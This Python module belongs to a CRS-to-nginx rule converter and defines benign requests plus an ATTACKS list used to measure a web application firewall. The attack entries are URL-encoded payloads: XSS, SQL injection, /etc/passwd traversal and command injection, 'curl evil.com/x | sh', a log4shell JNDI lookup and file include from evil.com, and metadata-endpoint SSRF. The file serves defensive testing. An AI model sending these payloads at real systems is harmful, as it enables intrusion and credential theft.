"""
The ordinary traffic a generated rule must not refuse, and the attacks it should.

A converted CRS rule keeps its regular expression and loses everything else: the
transformations it was written to run after, the specific target it was aimed
at, and the anomaly score that let several weak signals accumulate before
anything was refused. What survives is one regex matched against one raw request
component. Whether that is safe to block on is a question about this project's
output, not about CRS, so it is measured rather than assumed.

`BENIGN` is traffic that must never be refused. json2nginx.py checks every
candidate rule against it and refuses to emit one that matches, which is why
this module sits beside the converters rather than under tests/: the exclusion
is part of generating, not part of checking afterwards.

`ATTACKS` is traffic that should be refused, and it only reports: a rule is
never included because it caught something. Each entry appears twice in the
measurement, once percent-encoded as a browser would send it and once in clear,
because the gap between the two is exactly the transformation chain nginx cannot
apply.

Both are deliberately unexotic. The point is not to be exhaustive, it is to be
the kind of traffic a small site sees in an hour.
"""

from typing import Dict, List

# What every entry sends unless it says otherwise. A real browser, a real host.
_DEFAULTS = {
    "user_agent": (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
    ),
    "host": "example.com",
    "referer": "https://example.com/",
    "content_type": "",
}

# The request component each rule location is matched against, by the nginx
# variable json2nginx.py keys its map on.
VARIABLE_FIELDS = {
    "$request_uri": "request_uri",
    "$args": "args",
    "$http_user_agent": "user_agent",
    "$http_host": "host",
    "$http_referer": "referer",
    "$http_content_type": "content_type",
}


def request(name: str, path: str, query: str = "", **overrides) -> Dict[str, str]:
    """
    Builds one request, as the set of components nginx exposes as variables.

    Args:
        name: What the request represents, used in reports.
        path: The path, already in the form it goes on the wire.
        query: The query string, without the leading `?`.
        **overrides: Any of user_agent, host, referer, content_type.

    Returns:
        A dict with `name` and one key per matchable request component.
    """
    entry = dict(_DEFAULTS)
    entry.update(overrides)
    entry["name"] = name
    entry["path"] = path
    entry["args"] = query
    entry["request_uri"] = f"{path}?{query}" if query else path
    return entry


# Ordinary requests. A rule that matches any of these cannot block.
BENIGN: List[Dict[str, str]] = [
    request("home", "/"),
    request("static asset", "/static/app.css", "v=3"),
    request("article with a dated path", "/blog/2026/09/what-we-learned"),
    request("pagination", "/api/v1/users", "page=2&per_page=50"),
    request("search box", "/search", "q=hello+world"),
    request("search with punctuation", "/search", "q=what%27s+new"),
    request("search with an ampersand", "/search", "q=tom+%26+jerry"),
    request("email in a parameter", "/signup", "email=mario.rossi%40example.com"),
    request("absolute url in a parameter", "/share", "url=https%3A%2F%2Fexample.com%2Fa"),
    request("return path", "/login", "next=%2Fdashboard%3Ftab%3Dbilling"),
    request("campaign tracking", "/landing",
            "utm_source=newsletter&utm_medium=email&fbclid=abc123"),
    request("uuid in the path", "/orders/550e8400-e29b-41d4-a716-446655440000"),
    request("numeric id", "/products", "id=12345"),
    request("sort order", "/products", "sort=price&order=desc"),
    request("date range", "/reports", "from=2026-01-01&to=2026-09-30"),
    request("accented permalink", "/citt%C3%A0/genova"),
    request("file download", "/files/quarterly-report.xlsx"),
    request("api key style token", "/api/v1/me",
            "token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0"),
    request("boolean flags", "/settings", "notify=true&dark=false"),
    request("comma separated list", "/api/v1/items", "fields=id,name,price"),
    request("json-ish value", "/api/v1/filter", "where=%7B%22status%22%3A%22open%22%7D"),
    request("percent in a value", "/stats", "growth=15%25"),
    request("plus in a value", "/calc", "expr=1%2B1"),
    request("path with underscores", "/docs/getting_started"),
    request("versioned asset", "/assets/main.4f3a2b1c.js"),
    request("feed", "/feed.xml"),
    request("sitemap", "/sitemap.xml"),
    request("robots", "/robots.txt"),
    request("health check", "/healthz"),
    request("locale prefix", "/it/prodotti"),
    # Clients that are not a browser, and headers that are not the default.
    request("curl", "/api/v1/me", user_agent="curl/8.7.1", referer=""),
    request("a search engine", "/", user_agent=(
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
        referer=""),
    request("an uptime monitor", "/healthz", user_agent="Better Uptime Bot", referer=""),
    request("a json api call", "/api/v1/orders", content_type="application/json"),
    request("a form post", "/contact",
            content_type="application/x-www-form-urlencoded"),
    request("a subdomain", "/", host="api.example.com"),
    request("a host with a port", "/", host="example.com:8443"),
    request("an external referer", "/article",
            referer="https://news.ycombinator.com/item?id=12345"),
]

# Requests that should be refused. Each names the class of attack it stands for.
ATTACKS: List[Dict[str, str]] = [
    request("xss script tag", "/search", "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
    request("xss img onerror", "/search", "q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E"),
    request("xss javascript uri", "/go", "next=javascript%3Aalert%281%29"),
    request("sqli union select", "/products",
            "id=1%27+UNION+SELECT+password+FROM+users--"),
    request("sqli tautology", "/login", "user=admin%27+OR+%271%27%3D%271"),
    request("sqli sleep", "/products", "id=1+AND+SLEEP%285%29"),
    request("path traversal", "/download", "file=..%2F..%2F..%2Fetc%2Fpasswd"),
    request("path traversal encoded", "/download", "file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    request("rce semicolon", "/ping", "host=127.0.0.1%3Bcat+%2Fetc%2Fpasswd"),
    request("rce backtick", "/ping", "host=%60id%60"),
    request("rce pipe to shell", "/exec", "cmd=curl+evil.com%2Fx+%7C+sh"),
    request("log4shell jndi", "/", "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D"),
    request("ssrf to localhost", "/fetch", "url=http%3A%2F%2F127.0.0.1%3A8080%2Fadmin"),
    request("ssrf to metadata", "/fetch",
            "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"),
    request("lfi php wrapper", "/view",
            "page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex"),
    request("rfi remote include", "/view", "page=http%3A%2F%2Fevil.com%2Fshell.txt"),
    request("null byte", "/view", "file=index.php%00.jpg"),
    request("sensitive file", "/.env"),
    request("git directory", "/.git/config"),
    request("web shell", "/uploads/c99.php"),
    request("scanner user agent", "/", user_agent="sqlmap/1.8#stable"),
]
